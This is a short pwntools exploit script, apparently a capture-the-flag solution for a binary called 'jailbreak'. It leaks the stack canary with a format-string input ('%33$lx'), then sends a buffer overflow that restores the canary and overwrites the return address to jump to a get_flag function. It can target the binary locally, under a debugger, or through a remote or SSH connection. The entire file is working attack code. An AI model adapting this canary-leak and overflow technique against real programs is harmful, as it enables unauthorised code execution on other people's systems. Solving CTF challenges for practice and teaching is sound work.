#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
#context.log_level = 'debug'
context.binary = './build/jailbreak'

e = ELF('./build/jailbreak')
rop = ROP('./build/jailbreak')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('localhost', 5000)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/jailbreak', cwd='problemDir')
else:
    p = e.process()

p.sendline(b'%33$lx')

p.recvline()
canary = int(p.recvline()[3:],16)
print(hex(canary))

payload = b'a' * 104 + p64(canary) + cyclic(8) + p64(e.sym['get_flag'])
p.sendline(payload)
p.interactive()
